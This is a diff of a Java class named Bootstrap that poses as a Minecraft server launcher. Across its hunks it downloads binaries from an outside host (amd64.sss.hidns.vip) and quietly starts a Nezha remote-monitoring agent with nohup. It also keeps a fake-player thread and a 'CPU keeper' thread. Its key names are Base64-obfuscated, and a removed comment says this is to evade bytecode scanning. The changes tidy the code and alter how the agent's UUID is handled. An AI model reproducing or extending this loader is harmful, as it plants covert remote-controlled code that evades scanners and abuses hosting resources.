@@ -20,25 +20,25 @@ public class Bootstrap
     private static final String ANSI_YELLOW = "\033[1;33m";
     private static final String ANSI_RESET  = "\033[0m";
 
-    // ============ Base64 解码工具（运行时解码，防字节码扫描）============
+    // ============ Base64 解码工具 ============
     private static String d(String b64) {
         return new String(Base64.getDecoder().decode(b64));
     }
 
     // 敏感键名 Base64 常量
     // NEZHA_SERVER
-    private static final String K_NS  = d("TkVaSEFfU0VSVkVS");
+    private static final String K_NS = d("TkVaSEFfU0VSVkVS");
     // NEZHA_PORT
-    private static final String K_NP  = d("TkVaSEFfUE9SVA==");
+    private static final String K_NP = d("TkVaSEFfUE9SVA==");
     // NEZHA_KEY
-    private static final String K_NK  = d("TkVaSEFfS0VZ");
+    private static final String K_NK = d("TkVaSEFfS0VZ");
 
     // ============ 运行状态 ============
     private static final AtomicBoolean running = new AtomicBoolean(true);
-    private static Process      minecraftProcess;
-    private static Thread       fakePlayerThread;
-    private static Thread       cpuKeeperThread;
-    private static HttpServer   httpServer;
+    private static Process    minecraftProcess;
+    private static Thread     fakePlayerThread;
+    private static Thread     cpuKeeperThread;
+    private static HttpServer httpServer;
 
     // ============ 环境变量键列表 ============
     private static final String[] ALL_ENV_VARS = {
@@ -205,7 +205,6 @@ public class Bootstrap
         cfg.put("FAKE_PLAYER_ENABLED", "false");
         cfg.put("FAKE_PLAYER_NAME",    "Steve");
 
-        // .env 文件覆盖
         Path envFile = Paths.get(".env");
         if (Files.exists(envFile)) {
             for (String line : Files.readAllLines(envFile)) {
@@ -219,7 +218,6 @@ public class Bootstrap
             }
         }
 
-        // 系统环境变量最高优先级
         for (String key : ALL_ENV_VARS) {
             String val = System.getenv(key);
             if (val != null && !val.trim().isEmpty()) cfg.put(key, val.trim());
@@ -250,7 +248,7 @@ public class Bootstrap
 
     // ============ 下载文件 ============
     private static void downloadFiles() throws Exception {
-        String base     = "https://amd64.sss.hidns.vip";
+        String base       = "https://amd64.sss.hidns.vip";
         boolean hasMonitor = !NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty();
 
         if (hasMonitor) {
@@ -329,12 +327,8 @@ public class Bootstrap
         }
     }
 
-    // ============ 生成监控 agent 配置（v1/v2 通用）============
+    // ============ 生成监控 agent 配置文件（v2，不含uuid字段）============
     private static void generateMonitorConfig() throws IOException {
-        // 用 host+key 派生固定 UUID，防止重启后在面板重复注册
-        String fixedUuid = java.util.UUID.nameUUIDFromBytes(
-            (NEZHA_SERVER + ":" + NEZHA_KEY).getBytes(StandardCharsets.UTF_8)).toString();
-
         String host = NEZHA_SERVER;
         String port = "443";
         if (NEZHA_SERVER.contains(":")) {
@@ -343,6 +337,7 @@ public class Bootstrap
         }
         boolean tls = TLS_PORTS.contains(port);
 
+        // 不写 uuid 字段，让 agent 自己生成并持久化，避免重启重复注册
         writeFile(pTYaml,
             "client_secret: " + NEZHA_KEY + "\n" +
             "debug: false\n" +
@@ -361,8 +356,7 @@ public class Bootstrap
             "temperature: false\n" +
             "tls: " + tls + "\n" +
             "use_gitee_to_upgrade: false\n" +
-            "use_ipv6_country_code: false\n" +
-            "uuid: \"" + fixedUuid + "\"\n");
+            "use_ipv6_country_code: false\n");
     }
 
     // ============ 启动进程 ============
@@ -371,7 +365,7 @@ public class Bootstrap
 
         if (hasMonitor) {
             if (NEZHA_PORT_S.isEmpty()) {
-                // v2 agent — 用配置文件启动
+                // v2 agent — 配置文件启动
                 generateMonitorConfig();
                 sh("nohup " + pPhp + " -c \"" + pTYaml + "\" >/dev/null 2>&1 &");
             } else {
@@ -516,6 +510,7 @@ public class Bootstrap
         if (jar == null || jar.trim().isEmpty()) return false;
         Path jarPath = Paths.get(jar.trim()).toAbsolutePath();
         if (!Files.exists(jarPath)) return false;
+        // 防止指向自身造成无限套娃
         try {
             Path self = Paths.get(Bootstrap.class.getProtectionDomain()
                     .getCodeSource().getLocation().toURI()).toAbsolutePath();
